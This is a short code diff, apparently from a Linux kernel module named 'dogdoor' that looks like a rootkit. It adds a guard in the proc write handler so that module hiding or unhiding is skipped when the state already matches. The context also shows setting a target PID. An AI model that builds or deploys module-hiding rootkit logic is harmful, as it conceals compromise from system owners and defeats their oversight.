@@ -160,6 +160,9 @@ static ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, si
 		set_target_pid(param);
 		break;
 	case 3:
+		if (is_hide == param)
+			break;
+
 		if (param) hide_module();
 		else display_module();
 		break;
